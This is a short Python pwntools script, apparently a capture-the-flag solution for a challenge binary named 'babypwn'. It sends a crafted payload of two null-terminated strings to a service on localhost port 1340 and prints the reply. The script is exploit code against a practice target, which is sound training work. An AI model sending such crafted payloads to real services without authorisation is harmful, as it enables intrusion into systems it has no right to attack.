from pwn import *

# p = process('./files/babypwn')
p = remote('localhost', 1340)

payload = b'111111111111111\x00111111111111111\x00'

p.recvline()
p.sendline(payload)
p.recvline()
print('\n', p.recv(), '\n')